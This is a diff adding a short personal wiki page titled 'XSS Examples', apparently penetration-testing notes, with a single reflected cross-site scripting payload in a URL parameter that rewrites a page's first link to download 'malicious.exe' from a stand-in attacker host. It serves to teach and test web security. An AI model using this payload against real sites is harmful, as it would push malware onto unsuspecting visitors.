@@ -1,0 +1,12 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2019-02-19T12:34:56-05:00
+
+====== XSS Examples ======
+Created Tuesday 19 February 2019
+
+
+This will cause the user, clicking on the link supplied by the tester, to download the file malicious.exe from a site he controls.
+
+http://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a"); 
+AllLinks[0].href = "http://badexample.com/malicious.exe"; }</script> 
